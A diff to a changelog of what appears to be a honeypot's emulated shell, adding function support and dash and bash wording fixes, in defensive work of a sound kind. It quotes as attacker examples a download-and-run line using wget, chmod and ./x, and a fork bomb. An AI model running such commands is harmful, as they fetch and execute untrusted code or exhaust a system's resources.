@@ -118,6 +118,31 @@
   `/metrics`, and a WARN log line in both the daemon and the standalone `intake`.
   `deploy/provision.sh` creates the directory; `deploy/intake.service` gains it as an optional
   `ReadWritePaths` entry. The directory is never cleaned automatically.
+- **The fake shell runs functions** - `f() { wget URL; chmod +x x; ./x; }; f` used to define
+  nothing and run nothing ("parse and are skipped with status 0"), which a bot could tell from a
+  real shell. Definitions (`name() body`, and bash's `function name [()] body`) are stored and
+  calls run the body with its own `$1`..`$n`, `$#` and `$@` (`$0` unchanged), `local` variables,
+  no enclosing loop for `break`, and `return [n]`; a function answers before a builtin or a
+  file, and `command`, `builtin`, `env` and `sh -c` do not see it. Redirections on the definition
+  apply at each call, a subshell, pipeline stage or `$( )` gets a copy and loses what it
+  defines, and `type f`, `command -v`/`-V`, `unset -f`, `export -f` (bash), `$FUNCNAME`,
+  `FUNCNEST` and `set` follow each shell: bash prints the parsed body in its own layout, dash only
+  says `f is a shell function`. dash refuses the special builtins (`:`, `set`, `export`,
+  `return`, `local` ...) and any name that is not an identifier as
+  `Syntax error: Bad function name` before running the line, and has no `function` keyword; bash
+  takes any literal word and needs a compound body. A download inside a called function is now an executed fetch, reported
+  with the URL it expanded to, and a function defined and called on one line is one event; a
+  definition never called is still reported from its text. Recursion is capped at 10 running
+  functions and every call costs the line 256 steps of its work allowance, so a fork bomb
+  `:(){ :|:& };:` returns at once in bash (dash refuses the name `:`). Past the cap dash says
+  `Maximum function recursion depth (1000) reached` and exits 2; bash, which has no limit without
+  `FUNCNEST` and dies of a stack overflow without a word, ends the line with status 139 and keeps
+  the session; `FUNCNEST=N` gives `f: maximum function nesting level exceeded (N)`. Up to 128
+  functions are held per shell and their text counts against the connection's content allowance
+  with the variables. Every reply was checked against Ubuntu 22.04's dash 0.5.11 and bash 5.1.16
+  in a container, and three session fixtures replay them. The grammar note that listed `case` as
+  skipped is corrected: only `[[ ]]`, `(( ))`, `coproc`, `$'..'`, `${x##*/}`, brace expansion,
+  `<<<`, arrays and process substitution are skipped now.
 
 ### Changed
 
@@ -174,6 +199,12 @@
 
 ### Fixed
 
+- **dash's `cd` error and `type` wording** - a failed `cd` under dash said bash's
+  `cd: DIR: No such file or directory` with status 1; dash says `cd: can't cd to DIR` and exits 2.
+  `type` and `command -V` called every builtin `a shell builtin`; dash calls its special builtins
+  (`:`, `.`, `break`, `continue`, `eval`, `exec`, `exit`, `export`, `local`, `readonly`, `return`,
+  `set`, `shift`, `times`, `trap`, `unset`) `a special shell builtin`. Both checked against dash
+  0.5.11.
 - **The feed and intake database tests no longer share a database** - the feed builder tests
   (11), intake's `audit_regressions` and two of the `end_to_end` tests ran on one persistent
   database and reset it by hand. The feed suite's `DELETE FROM event` severed the shared
